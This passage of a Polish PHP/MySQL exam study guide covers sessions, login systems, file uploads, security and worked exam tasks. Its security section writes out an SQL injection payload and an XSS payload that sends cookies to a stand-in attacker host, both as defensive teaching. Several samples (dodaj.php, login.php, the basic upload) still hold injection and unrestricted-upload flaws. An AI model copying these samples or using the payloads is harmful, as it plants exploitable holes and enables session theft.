    <footer>
        <p>Portal Firmowy &copy; 2025</p>
    </footer>
</body>
</html>
```

**dodaj.php:**
```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $conn = mysqli_connect("localhost", "root", "", "firma");
    mysqli_set_charset($conn, "utf8");
    
    $nazwa = $_POST["nazwa"];
    $budzet = $_POST["budzet"];
    $pracownik_id = $_POST["pracownik_id"];
    
    $sql = "INSERT INTO projekty (nazwa, budzet, data_rozpoczecia, pracownik_id) 
            VALUES ('$nazwa', $budzet, CURRENT_DATE(), $pracownik_id)";
    
    if (mysqli_query($conn, $sql)) {
        echo "Projekt dodany pomyślnie!<br>";
        echo "<a href='index.php'>Powrót do listy</a>";
    } else {
        echo "Błąd: " . mysqli_error($conn);
    }
    
    mysqli_close($conn);
}
?>
```

**styl.css:**
```css
body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    background-color: #f4f4f4;
}

header {
    background-color: #333;
    color: white;
    padding: 20px;
    text-align: center;
}

header img {
    width: 100px;
}

section {
    margin: 20px;
    padding: 20px;
    background-color: white;
    border-radius: 5px;
}

table {
    width: 100%;
    border-collapse: collapse;
}

th, td {
    border: 1px solid #ddd;
    padding: 10px;
    text-align: left;
}

th {
    background-color: #333;
    color: white;
}

tr:hover {
    background-color: #f5f5f5;
}

input, select, button {
    padding: 8px;
    margin: 5px 0;
    width: 100%;
    max-width: 400px;
}

button {
    background-color: #4CAF50;
    color: white;
    border: none;
    cursor: pointer;
}

button:hover {
    background-color: #45a049;
}

footer {
    background-color: #333;
    color: white;
    text-align: center;
    padding: 10px;
    position: fixed;
    bottom: 0;
    width: 100%;
}
```

### **Checklist - Co musisz zrobić na egzaminie:**

#### **Przed egzaminem:**
- [ ] Sprawdź czy działa XAMPP (Apache i MySQL)
- [ ] Otwórz phpMyAdmin (`localhost/phpmyadmin`)
- [ ] Przygotuj edytor kodu (VS Code, Notepad++)
- [ ] Sprawdź czy masz dostęp do GIMP/Photoshop

#### **Podczas egzaminu - Baza danych:**
- [ ] Zaimportuj udostępnioną bazę SQL
- [ ] Wykonaj każde zapytanie w phpMyAdmin
- [ ] Zrób zrzut ekranu każdego wyniku (PNG/JPG)
- [ ] Zapisz wszystkie zapytania do `kwerendy.txt`
- [ ] Sprawdź czy nazwy plików są poprawne

#### **Podczas egzaminu - Strona:**
- [ ] Stwórz strukturę HTML5 (header, section, footer)
- [ ] Dodaj zewnętrzny plik CSS (`styl.css`)
- [ ] Połącz PHP z bazą (`mysqli_connect`)
- [ ] Wyświetl dane w tabeli (pętla `while`)
- [ ] Dodaj formularz z obsługą POST
- [ ] Sprawdź czy formularz działa
- [ ] ZAMKNIJ połączenia (`mysqli_close`)

#### **Podczas egzaminu - Grafika:**
- [ ] Otwórz plik w GIMP/Photoshop
- [ ] Wykonaj wymagane operacje
- [ ] Zapisz w odpowiednim formacie
- [ ] Sprawdź wymiary i nazwę pliku

#### **Przed oddaniem:**
- [ ] Sprawdź czy wszystkie pliki są w folderze
- [ ] Przetestuj stronę w przeglądarce
- [ ] Sprawdź czy formularz działa
- [ ] Sprawdź czy wszystkie połączenia są zamknięte
- [ ] Zrób backup na dysk USB

### **Typowe błędy na egzaminie - UNIKAJ ICH!**

❌ **Brak `mysqli_close()`** - STRATA PUNKTÓW!
❌ **Niepoprawna nazwa bazy danych** - strona nie działa
❌ **Brak pliku `kwerendy.txt`** - strata punktów
❌ **Brak zrzutów ekranu** - strata punktów
❌ **Błędy w zapytaniach SQL** - sprawdź składnię!
❌ **Niezabezpieczone dane** - używaj `htmlspecialchars()`
❌ **Brak testowania** - sprawdź czy wszystko działa!

---

## **12. Sesje i ciasteczka**

### **Sesje - przechowywanie danych użytkownika**

Sesje pozwalają przechowywać dane na serwerze dla konkretnego użytkownika.

```php
<?php
    // ZAWSZE na początku pliku!
    session_start();
    
    // Zapisywanie danych w sesji
    $_SESSION["uzytkownik"] = "Jan";
    $_SESSION["zalogowany"] = true;
    $_SESSION["rola"] = "admin";
    
    echo "Sesja rozpoczęta";
?>
```

**Odczyt danych z sesji:**

```php
<?php
    session_start();
    
    if (isset($_SESSION["zalogowany"]) && $_SESSION["zalogowany"] === true) {
        echo "Witaj, " . $_SESSION["uzytkownik"] . "!";
        echo "Twoja rola: " . $_SESSION["rola"];
    } else {
        echo "Nie jesteś zalogowany";
    }
?>
```

**Usuwanie danych z sesji:**

```php
<?php
    session_start();
    
    // Usuń konkretną zmienną
    unset($_SESSION["uzytkownik"]);
    
    // Usuń wszystkie dane sesji
    session_unset();
    
    // Zniszcz sesję całkowicie
    session_destroy();
?>
```

### **Kompletny system logowania**

**login.html:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Logowanie</title>
</head>
<body>
    <h2>Panel logowania</h2>
    
    <form method="POST" action="login.php">
        <label>Login:</label>
        <input type="text" name="login" required><br><br>
        
        <label>Hasło:</label>
        <input type="password" name="haslo" required><br><br>
        
        <button type="submit">Zaloguj</button>
    </form>
</body>
</html>
```

**login.php:**
```php
<?php
    session_start();
    
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Połączenie z bazą (styl proceduralny)
        $conn = mysqli_connect("localhost", "root", "", "mojabaza");
        
        if (!$conn) {
            die("Błąd połączenia: " . mysqli_connect_error());
        }
        
        mysqli_set_charset($conn, "utf8");
        
        $login = $_POST["login"];
        $haslo = $_POST["haslo"];
        
        // Pobierz użytkownika z bazy
        $sql = "SELECT id, login, haslo, rola FROM uzytkownicy WHERE login='$login'";
        $wynik = mysqli_query($conn, $sql);
        
        if (mysqli_num_rows($wynik) === 1) {
            $uzytkownik = mysqli_fetch_array($wynik);
            
            // Sprawdź hasło (używając password_verify)
            if (password_verify($haslo, $uzytkownik["haslo"])) {
                // Poprawne logowanie
                $_SESSION["zalogowany"] = true;
                $_SESSION["user_id"] = $uzytkownik["id"];
                $_SESSION["login"] = $uzytkownik["login"];
                $_SESSION["rola"] = $uzytkownik["rola"];
                
                header("Location: panel.php");
                exit();
            } else {
                echo "Błędne hasło";
            }
        } else {
            echo "Użytkownik nie istnieje";
        }
        
        mysqli_close($conn);
    }
?>
```

**panel.php:**
```php
<?php
    session_start();
    
    // Sprawdzenie czy zalogowany
    if (!isset($_SESSION["zalogowany"]) || $_SESSION["zalogowany"] !== true) {
        header("Location: login.html");
        exit();
    }
?>

<!DOCTYPE html>
<html>
<head>
    <title>Panel użytkownika</title>
</head>
<body>
    <h2>Witaj, <?php echo htmlspecialchars($_SESSION["login"]); ?>!</h2>
    
    <p>Jesteś zalogowany jako: <?php echo $_SESSION["rola"]; ?></p>
    
    <h3>Menu:</h3>
    <ul>
        <li><a href="profil.php">Mój profil</a></li>
        <li><a href="ustawienia.php">Ustawienia</a></li>
        <li><a href="logout.php">Wyloguj</a></li>
    </ul>
</body>
</html>
```

**logout.php:**
```php
<?php
    session_start();
    session_unset();
    session_destroy();
    header("Location: login.html");
    exit();
?>
```

### **Ciasteczka (Cookies)**

Ciasteczka przechowują dane w przeglądarce użytkownika:

```php
<?php
    // Ustawianie ciasteczka
    // setcookie(nazwa, wartość, wygaśnięcie, ścieżka, domena, secure, httponly)
    setcookie("uzytkownik", "Jan", time() + (86400 * 30), "/");  // 30 dni
    
    echo "Ciasteczko ustawione";
?>
```

**Odczyt ciasteczka:**

```php
<?php
    if (isset($_COOKIE["uzytkownik"])) {
        echo "Witaj ponownie, " . $_COOKIE["uzytkownik"];
    } else {
        echo "To Twoja pierwsza wizyta";
    }
?>
```

**Usuwanie ciasteczka:**

```php
<?php
    // Ustaw czas wygaśnięcia w przeszłości
    setcookie("uzytkownik", "", time() - 3600, "/");
    echo "Ciasteczko usunięte";
?>
```

**Różnice: Sesje vs Ciasteczka**

| Cecha | Sesje | Ciasteczka |
|-------|-------|------------|
| Gdzie przechowywane? | Na serwerze | W przeglądarce użytkownika |
| Bezpieczeństwo | Wysokie | Niskie (użytkownik może modyfikować) |
| Rozmiar | Praktycznie nieograniczony | Maks. 4KB |
| Czas życia | Do zamknięcia przeglądarki | Można ustawić (dni, miesiące, lata) |
| Użycie | Logowanie, koszyk, dane wrażliwe | Preferencje, język, "Zapamiętaj mnie" |

---

## **13. Upload plików**

### **Formularz HTML**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Upload pliku</title>
</head>
<body>
    <!-- WAŻNE: enctype="multipart/form-data" jest OBOWIĄZKOWY! -->
    <form method="POST" action="upload.php" enctype="multipart/form-data">
        <label>Wybierz plik:</label>
        <input type="file" name="plik" required><br><br>
        
        <label>Opis:</label>
        <input type="text" name="opis"><br><br>
        
        <button type="submit">Prześlij</button>
    </form>
</body>
</html>
```

### **Podstawowy upload**

```php
<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["plik"])) {
        
        $nazwaPliku = $_FILES["plik"]["name"];
        $tmpNazwa = $_FILES["plik"]["tmp_name"];
        $rozmiar = $_FILES["plik"]["size"];
        $blad = $_FILES["plik"]["error"];
        
        // Sprawdzenie czy nie było błędu
        if ($blad === 0) {
            
            // Folder docelowy
            $folder = "uploads/";
            
            // Utwórz folder jeśli nie istnieje
            if (!file_exists($folder)) {
                mkdir($folder, 0777, true);
            }
            
            // Przeniesienie pliku
            $sciezka = $folder . $nazwaPliku;
            
            if (move_uploaded_file($tmpNazwa, $sciezka)) {
                echo "Plik przesłany pomyślnie: $nazwaPliku";
            } else {
                echo "Błąd podczas przesyłania pliku";
            }
            
        } else {
            echo "Wystąpił błąd przy przesyłaniu";
        }
    }
?>
```

### **Upload z zabezpieczeniami (WAŻNE!)**

```php
<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["plik"])) {
        
        $plik = $_FILES["plik"];
        $nazwaPliku = $plik["name"];
        $tmpNazwa = $plik["tmp_name"];
        $rozmiar = $plik["size"];
        
        // 1. Sprawdzenie rozszerzenia
        $rozszerzenie = strtolower(pathinfo($nazwaPliku, PATHINFO_EXTENSION));
        $dozwolone = ["jpg", "jpeg", "png", "gif", "pdf", "doc", "docx"];
        
        if (!in_array($rozszerzenie, $dozwolone)) {
            die("❌ Niedozwolony typ pliku! Dozwolone: " . implode(", ", $dozwolone));
        }
        
        // 2. Sprawdzenie rozmiaru (max 5MB)
        $maxRozmiar = 5 * 1024 * 1024;  // 5MB w bajtach
        
        if ($rozmiar > $maxRozmiar) {
            die("❌ Plik jest za duży! Maksymalny rozmiar: 5MB");
        }
        
        // 3. Generowanie bezpiecznej nazwy pliku
        $nowaNazwa = uniqid() . "_" . time() . "." . $rozszerzenie;
        
        // 4. Przeniesienie pliku
        $folder = "uploads/";
        $sciezka = $folder . $nowaNazwa;
        
        if (move_uploaded_file($tmpNazwa, $sciezka)) {
            echo "✅ Plik przesłany pomyślnie!<br>";
            echo "📂 Zapisano jako: $nowaNazwa";
        } else {
            echo "❌ Błąd podczas przesyłania pliku";
        }
    }
?>
```

### **Upload wielu plików**

```html
<form method="POST" action="upload_multi.php" enctype="multipart/form-data">
    <input type="file" name="pliki[]" multiple required><br><br>
    <button type="submit">Prześlij pliki</button>
</form>
```

```php
<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["pliki"])) {
        
        $pliki = $_FILES["pliki"];
        $iloscPlikow = count($pliki["name"]);
        
        for ($i = 0; $i < $iloscPlikow; $i++) {
            
            $nazwa = $pliki["name"][$i];
            $tmpNazwa = $pliki["tmp_name"][$i];
            $rozmiar = $pliki["size"][$i];
            
            if ($pliki["error"][$i] === 0) {
                
                // Walidacja (tak samo jak wcześniej)
                $rozszerzenie = strtolower(pathinfo($nazwa, PATHINFO_EXTENSION));
                $dozwolone = ["jpg", "jpeg", "png", "gif"];
                
                if (!in_array($rozszerzenie, $dozwolone)) {
                    echo "❌ Pominięto $nazwa - niedozwolony typ<br>";
                    continue;
                }
                
                $nowaNazwa = uniqid() . "_" . $nazwa;
                $sciezka = "uploads/" . $nowaNazwa;
                
                if (move_uploaded_file($tmpNazwa, $sciezka)) {
                    echo "✅ Przesłano: $nazwa<br>";
                }
            }
        }
    }
?>
```

---

## **14. Bezpieczeństwo aplikacji**

Bezpieczeństwo to NAJWAŻNIEJSZY aspekt tworzenia aplikacji PHP!

### **SQL Injection - największe zagrożenie**

**ŹLE - podatne na atak:**

```php
<?php
    // ❌ NIGDY TAK NIE RÓB!
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    $login = $_POST["login"];
    $sql = "SELECT * FROM uzytkownicy WHERE login = '$login'";
    $wynik = mysqli_query($conn, $sql);
    
    // Atakujący może wpisać: admin' OR '1'='1
    // Zapytanie stanie się: SELECT * FROM uzytkownicy WHERE login = 'admin' OR '1'='1'
    // To zaloguje pierwszego użytkownika bez hasła!
    
    mysqli_close($conn);
?>
```

**DOBRZE - bezpieczne (dla egzaminu INF.03):**

**UWAGA:** Na egzaminie INF.03 zwykle NIE wymagają Prepared Statements, ale musisz używać podstawowych zabezpieczeń:

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    mysqli_set_charset($conn, "utf8");
    
    // Zabezpieczenie danych przed SQL Injection
    $login = mysqli_real_escape_string($conn, $_POST["login"]);
    $haslo = mysqli_real_escape_string($conn, $_POST["haslo"]);
    
    $sql = "SELECT * FROM uzytkownicy WHERE login='$login'";
    $wynik = mysqli_query($conn, $sql);
    
    if (mysqli_num_rows($wynik) > 0) {
        $uzytkownik = mysqli_fetch_array($wynik);
        // Sprawdzanie hasła...
    }
    
    mysqli_close($conn);
?>
```

**mysqli_real_escape_string()** - zabezpiecza przed SQL Injection (WAŻNE na egzaminie!)

### **XSS (Cross-Site Scripting) - wstrzykiwanie kodu**

**ŹLE:**

```php
<?php
    // ❌ NIEBEZPIECZNE!
    $komentarz = $_POST["komentarz"];
    echo $komentarz;
    
    // Atakujący może wpisać: <script>alert('XSS')</script>
    // Lub: <script>document.location='http://zly-serwer.com?cookie='+document.cookie</script>
?>
```

**DOBRZE:**

```php
<?php
    // ✅ BEZPIECZNE - htmlspecialchars()
    $komentarz = htmlspecialchars($_POST["komentarz"], ENT_QUOTES, 'UTF-8');
    echo $komentarz;
    
    // Tagi HTML zostaną zamienione na tekst:
    // <script> → &lt;script&gt;
?>
```

### **Hashowanie haseł - NIGDY w czystej postaci!**

**ŹLE:**

```php
<?php
    // ❌ NIGDY tak nie przechowuj haseł!
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    $haslo = $_POST["haslo"];
    $sql = "INSERT INTO uzytkownicy (login, haslo) VALUES ('$login', '$haslo')";
    mysqli_query($conn, $sql);
    // Hasło w bazie: "mojhaslo123"
    
    mysqli_close($conn);
?>
```

**DOBRZE:**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    mysqli_set_charset($conn, "utf8");
    
    // ✅ Rejestracja - hashowanie hasła
    $login = $_POST["login"];
    $haslo = $_POST["haslo"];
    $hashHasla = password_hash($haslo, PASSWORD_DEFAULT);
    
    $sql = "INSERT INTO uzytkownicy (login, haslo) VALUES ('$login', '$hashHasla')";
    mysqli_query($conn, $sql);
    // Hasło w bazie: "$2y$10$..." (zahashowane)
    
    mysqli_close($conn);
    
    // ✅ Logowanie - weryfikacja hasła
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    $login = $_POST["login"];
    $haslo = $_POST["haslo"];
    
    $sql = "SELECT id, haslo FROM uzytkownicy WHERE login='$login'";
    $wynik = mysqli_query($conn, $sql);
    $uzytkownik = mysqli_fetch_array($wynik);
    
    if ($uzytkownik && password_verify($haslo, $uzytkownik["haslo"])) {
        echo "Zalogowano pomyślnie!";
        $_SESSION["user_id"] = $uzytkownik["id"];
    } else {
        echo "Błędne dane logowania";
    }
    
    mysqli_close($conn);
?>
```

### **CSRF (Cross-Site Request Forgery) - fałszywe żądania**

```php
<?php
    session_start();
    
    // Generowanie tokenu CSRF
    if (empty($_SESSION["csrf_token"])) {
        $_SESSION["csrf_token"] = bin2hex(random_bytes(32));
    }
?>

<!-- Formularz z tokenem CSRF -->
<form method="POST" action="usuń_konto.php">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <button type="submit">Usuń konto</button>
</form>
```

```php
<?php
    // usuń_konto.php
    session_start();
    
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        
        // Weryfikacja tokenu CSRF
        if (!isset($_POST["csrf_token"]) || $_POST["csrf_token"] !== $_SESSION["csrf_token"]) {
            die("❌ Nieprawidłowy token CSRF!");
        }
        
        // Token prawidłowy - wykonaj akcję
        echo "Konto usunięte";
    }
?>
```

### **Walidacja danych**

```php
<?php
    // Walidacja email
    $email = $_POST["email"];
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        die("Nieprawidłowy email");
    }
    
    // Walidacja URL
    $strona = $_POST["strona"];
    if (!filter_var($strona, FILTER_VALIDATE_URL)) {
        die("Nieprawidłowy URL");
    }
    
    // Walidacja liczby całkowitej
    $wiek = $_POST["wiek"];
    if (!filter_var($wiek, FILTER_VALIDATE_INT) || $wiek < 1 || $wiek > 150) {
        die("Nieprawidłowy wiek");
    }
    
    // Czyszczenie tekstu (usunięcie tagów HTML)
    $opis = strip_tags($_POST["opis"]);
    
    // Walidacja długości
    $imie = trim($_POST["imie"]);
    if (strlen($imie) < 3 || strlen($imie) > 50) {
        die("Imię musi mieć 3-50 znaków");
    }
?>
```

### **Checklist bezpieczeństwa**

| ✅ | Zasada |
|---|--------|
| ✅ | Używaj **Prepared Statements** przy zapytaniach SQL |
| ✅ | Używaj **htmlspecialchars()** przy wyświetlaniu danych użytkownika |
| ✅ | Hashuj hasła funkcją **password_hash()** |
| ✅ | Waliduj WSZYSTKIE dane wejściowe |
| ✅ | Używaj tokenów **CSRF** w formularzach |
| ✅ | Sprawdzaj rozszerzenia i rozmiary uploadowanych plików |
| ✅ | Używaj HTTPS w produkcji |
| ✅ | Ograniczaj uprawnienia użytkownika bazy danych |
| ✅ | Nie wyświetlaj szczegółowych błędów użytkownikom |
| ✅ | Regularnie aktualizuj PHP i biblioteki |

---

## **15. Najczęstsze błędy i rozwiązywanie problemów**

### **1. Brak session_start()**

**Błąd:**
```php
<?php
    $_SESSION["user"] = "Jan";  // ❌ BŁĄD: Warning: Undefined variable $_SESSION
?>
```

**Rozwiązanie:**
```php
<?php
    session_start();  // ✅ ZAWSZE na początku
    $_SESSION["user"] = "Jan";
?>
```

### **2. Nagłówki wysłane przed header()**

**Błąd:**
```php
<?php
    echo "Coś";  // ❌ Już wysłano dane
    header("Location: strona.php");  // BŁĄD: Cannot modify header information
?>
```

**Rozwiązanie:**
```php
<?php
    header("Location: strona.php");  // ✅ Przed jakimkolwiek echo/HTML
    exit();
?>
```

### **3. Niezamknięte połączenie z bazą**

**Błąd:**
```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "baza");
    // ... kod ...
    // ❌ Brak zamknięcia! STRACISZ PUNKTY NA EGZAMINIE!
?>
```

**Rozwiązanie:**
```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "baza");
    // ... kod ...
    mysqli_close($conn);  // ✅ Zamknij połączenie (OBOWIĄZKOWE!)
?>
```

### **4. Używanie == zamiast ===**

**Błąd:**
```php
<?php
    $a = 0;
    $b = false;
    
    if ($a == $b) {  // ❌ TRUE! (0 == false)
        echo "Równe";
    }
?>
```

**Rozwiązanie:**
```php
<?php
    if ($a === $b) {  // ✅ FALSE (różne typy)
        echo "Równe";
    }
?>
```

### **5. Zapomnienie o enctype w formularzu**

**Błąd:**
```html
<!-- ❌ Brak enctype -->
<form method="POST" action="upload.php">
    <input type="file" name="plik">
</form>
```

**Rozwiązanie:**
```html
<!-- ✅ Z enctype -->
<form method="POST" action="upload.php" enctype="multipart/form-data">
    <input type="file" name="plik">
</form>
```

---

## **Podsumowanie - co musisz umieć na egzamin INF.03**

### ✅ **Podstawy PHP**
- Znaczniki `<?php ?>`
- `echo`, `print`
- Zmienne i typy danych
- Operatory

### ✅ **Struktury kontrolne**
- `if`, `else`, `elseif`
- `switch`
- Pętle: `for`, `while`, `foreach`
- `break`, `continue`

### ✅ **Tablice**
- Tworzenie (indeksowane i asocjacyjne)
- Operacje: `count()`, `in_array()`, `array_push()`, etc.
- Przechodzenie przez tablice

### ✅ **Funkcje**
- Definiowanie funkcji
- Parametry i wartości domyślne
- Zwracanie wartości (`return`)
- Funkcje wbudowane

### ✅ **Formularze**
- Odbieranie danych: `$_POST`, `$_GET`
- Walidacja danych
- Zabezpieczanie: `htmlspecialchars()`

### ✅ **Bazy danych MySQL**
- Połączenie z bazą (`mysqli`)
- SELECT, INSERT, UPDATE, DELETE
- **Prepared Statements** (najważniejsze!)
- Wyświetlanie wyników

### ✅ **Pliki**
- Odczyt: `file_get_contents()`, `fopen()`
- Zapis: `file_put_contents()`
- Upload plików

### ✅ **Sesje i ciasteczka**
- `session_start()`, `$_SESSION`
- `setcookie()`, `$_COOKIE`
- System logowania

### ✅ **Bezpieczeństwo**
- SQL Injection → Prepared Statements
- XSS → `htmlspecialchars()`
- Hashowanie haseł → `password_hash()`, `password_verify()`

---

## **Praktyczne zadania do ćwiczenia**

### **Zadanie 1: Kalkulator**
Stwórz formularz z dwoma polami liczbowymi i wyborem operacji (+, -, *, /). Wyświetl wynik.

**Wymagania:**
- Walidacja danych (czy to liczby)
- Obsługa dzielenia przez zero
- Wyświetlanie historii obliczeń

### **Zadanie 2: Księga gości**
Stwórz księgę gości z możliwością dodawania komentarzy.

**Wymagania:**
- Formularz: imię, email, treść komentarza
- Zapis do bazy danych
- Wyświetlanie wszystkich komentarzy
- Walidacja danych
- Zabezpieczenie przed XSS

### **Zadanie 3: System logowania**
Zbuduj kompletny system rejestracji i logowania.

**Wymagania:**
- Rejestracja z hashowaniem hasła
- Logowanie z weryfikacją
- Panel użytkownika (dostępny tylko po zalogowaniu)
- Wylogowanie
- Zabezpieczenie przed SQL Injection

### **Zadanie 4: Lista zadań (TODO)**
Aplikacja do zarządzania zadaniami.

**Wymagania:**
- Dodawanie zadań
- Oznaczanie jako wykonane
- Usuwanie zadań
- Edycja zadań
- Zapis w bazie danych

### **Zadanie 5: Galeria zdjęć**
System uploadu i wyświetlania zdjęć.

**Wymagania:**
- Upload zdjęć (jpg, png, gif)
- Walidacja typu i rozmiaru pliku
- Zapis nazw plików w bazie
- Wyświetlanie miniaturek
- Usuwanie zdjęć

---

## **TYPOWE ZADANIA EGZAMINACYJNE - ROZWIĄZANE KROK PO KROKU**

### **Zadanie typu 1: "Wyświetl produkty z kategorii X"**

**Polecenie:** *Napisz skrypt PHP, który wyświetli w tabeli HTML wszystkie produkty z kategorii "elektronika", które kosztują więcej niż 100 zł, posortowane malejąco według ceny.*

**Rozwiązanie krok po kroku:**

```php
<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Produkty</title>
    <style>
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid black; padding: 8px; }
        th { background-color: #333; color: white; }
    </style>
</head>
<body>
    <h2>Produkty z kategorii Elektronika (droższe niż 100 zł)</h2>
    
    <?php
    // Krok 1: Połączenie z bazą
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Krok 2: Sprawdzenie połączenia
    if (!$conn) {
        die("Błąd połączenia: " . mysqli_connect_error());
    }
    
    // Krok 3: Ustawienie UTF-8
    mysqli_set_charset($conn, "utf8");
    
    // Krok 4: Zapytanie SQL
    $sql = "SELECT nazwa, cena, opis 
            FROM produkty 
            WHERE kategoria = 'elektronika' AND cena > 100 
            ORDER BY cena DESC";
    
    // Krok 5: Wykonanie zapytania
    $wynik = mysqli_query($conn, $sql);
    
    // Krok 6: Sprawdzenie czy są wyniki
    if (mysqli_num_rows($wynik) > 0) {
        
        // Krok 7: Rozpoczęcie tabeli
        echo "<table>";
        echo "<tr><th>Nazwa</th><th>Cena</th><th>Opis</th></tr>";
        
        // Krok 8: Pętla while - wyświetlanie wierszy
        while ($produkt = mysqli_fetch_array($wynik)) {
            echo "<tr>";
            echo "<td>" . $produkt["nazwa"] . "</td>";
            echo "<td>" . $produkt["cena"] . " zł</td>";
            echo "<td>" . $produkt["opis"] . "</td>";
            echo "</tr>";
        }
        
        echo "</table>";
        
    } else {
        echo "<p>Brak produktów spełniających kryteria</p>";
    }
    
    // Krok 9: ZAMKNIĘCIE połączenia (OBOWIĄZKOWE!)
    mysqli_close($conn);
    ?>
</body>
</html>
```

### **Zadanie typu 2: "Policz ile zamówień złożył każdy klient"**

**Polecenie:** *Napisz zapytanie SQL, które wyświetli imię i nazwisko klienta oraz liczbę jego zamówień. Pokaż tylko klientów którzy złożyli więcej niż 3 zamówienia.*

**Rozwiązanie:**

```sql
SELECT klienci.imie, klienci.nazwisko, COUNT(zamowienia.id) as liczba_zamowien
FROM klienci
INNER JOIN zamowienia ON klienci.id = zamowienia.klient_id
GROUP BY klienci.id
HAVING liczba_zamowien > 3
ORDER BY liczba_zamowien DESC;
```

**W PHP:**

```php
<?php
$conn = mysqli_connect("localhost", "root", "", "sklep");
mysqli_set_charset($conn, "utf8");

$sql = "SELECT klienci.imie, klienci.nazwisko, COUNT(zamowienia.id) as liczba_zamowien
        FROM klienci
        INNER JOIN zamowienia ON klienci.id = zamowienia.klient_id
        GROUP BY klienci.id
        HAVING liczba_zamowien > 3
        ORDER BY liczba_zamowien DESC";

$wynik = mysqli_query($conn, $sql);

echo "<h3>Najaktywniejsz klienci (>3 zamówienia):</h3>";
echo "<ol>";

while ($klient = mysqli_fetch_array($wynik)) {
    echo "<li>" . $klient["imie"] . " " . $klient["nazwisko"];
    echo " - " . $klient["liczba_zamowien"] . " zamówień</li>";
}

echo "</ol>";

mysqli_close($conn);
?>
```

### **Zadanie typu 3: "Formularz z zapisem do bazy"**

**Polecenie:** *Stwórz formularz rejestracji użytkownika (imię, email, miasto) i skrypt PHP zapisujący dane do bazy.*

**formularz.html:**
```html
<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Rejestracja</title>
</head>
<body>
    <h2>Formularz rejestracji</h2>
    
    <form method="POST" action="zapisz.php">
        <label>Imię:</label><br>
        <input type="text" name="imie" required><br><br>
        
        <label>Email:</label><br>
        <input type="email" name="email" required><br><br>
        
        <label>Miasto:</label><br>
        <select name="miasto" required>
            <option value="">Wybierz miasto</option>
            <option value="Warszawa">Warszawa</option>
            <option value="Kraków">Kraków</option>
            <option value="Gdańsk">Gdańsk</option>
        </select><br><br>
        
        <button type="submit">Zarejestruj się</button>
    </form>
</body>
</html>
```

**zapisz.php:**
```php
<?php
// Sprawdzenie czy formularz został wysłany
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // Połączenie z bazą
    $conn = mysqli_connect("localhost", "root", "", "portal");
    
    if (!$conn) {
        die("Błąd połączenia: " . mysqli_connect_error());
    }
    
    mysqli_set_charset($conn, "utf8");
    
    // Odbieranie danych z formularza
    $imie = $_POST["imie"];
    $email = $_POST["email"];
    $miasto = $_POST["miasto"];
    
    // Zabezpieczenie przed SQL Injection
    $imie = mysqli_real_escape_string($conn, $imie);
    $email = mysqli_real_escape_string($conn, $email);
    $miasto = mysqli_real_escape_string($conn, $miasto);
    
    // Zapytanie INSERT z aktualną datą
    $sql = "INSERT INTO uzytkownicy (imie, email, miasto, data_rejestracji) 
            VALUES ('$imie', '$email', '$miasto', CURRENT_DATE())";
    
    // Wykonanie zapytania
    if (mysqli_query($conn, $sql)) {
        $noweID = mysqli_insert_id($conn);
        echo "<h3>✅ Rejestracja pomyślna!</h3>";
        echo "<p>Twoje ID: $noweID</p>";
        echo "<p>Imię: $imie</p>";
        echo "<p>Email: $email</p>";
        echo "<p>Miasto: $miasto</p>";
        echo "<a href='lista.php'>Zobacz wszystkich użytkowników</a>";
    } else {
        echo "<h3>❌ Błąd rejestracji</h3>";
        echo "<p>Szczegóły: " . mysqli_error($conn) . "</p>";
    }
    
    // Zamknięcie połączenia
    mysqli_close($conn);
    
} else {
    echo "Nieprawidłowe żądanie";
}
?>
```

### **Zadanie typu 4: "Oblicz średnią cenę w kategorii"**

**Polecenie:** *Napisz zapytanie SQL, które obliczy średnią cenę produktów w każdej kategorii. Wyświetl tylko kategorie gdzie średnia cena jest wyższa niż 200 zł.*

**Rozwiązanie SQL:**
```sql
SELECT kategoria, AVG(cena) as srednia_cena, COUNT(*) as ilosc_produktow
FROM produkty
GROUP BY kategoria
HAVING srednia_cena > 200
ORDER BY srednia_cena DESC;
```

**W PHP:**
```php
<?php
$conn = mysqli_connect("localhost", "root", "", "sklep");
mysqli_set_charset($conn, "utf8");

$sql = "SELECT kategoria, AVG(cena) as srednia_cena, COUNT(*) as ilosc_produktow
        FROM produkty
        GROUP BY kategoria
        HAVING srednia_cena > 200
        ORDER BY srednia_cena DESC";

$wynik = mysqli_query($conn, $sql);

echo "<h3>Kategorie premium (śr. cena > 200 zł):</h3>";
echo "<table border='1'>";
echo "<tr><th>Kategoria</th><th>Średnia cena</th><th>Liczba produktów</th></tr>";

while ($kategoria = mysqli_fetch_array($wynik)) {
    $srednia = round($kategoria["srednia_cena"], 2);
    echo "<tr>";
    echo "<td>" . $kategoria["kategoria"] . "</td>";
    echo "<td>" . $srednia . " zł</td>";
    echo "<td>" . $kategoria["ilosc_produktow"] . "</td>";
    echo "</tr>";
}

echo "</table>";

mysqli_close($conn);
?>
```

### **Zadanie typu 5: "Aktualizuj dane na podstawie warunku"**

**Polecenie:** *Napisz skrypt PHP, który zwiększy cenę wszystkich produktów z kategorii "sport" o 15%.*

**Rozwiązanie:**
```php
<?php
$conn = mysqli_connect("localhost", "root", "", "sklep");

if (!$conn) {
    die("Błąd połączenia: " . mysqli_connect_error());
}

mysqli_set_charset($conn, "utf8");

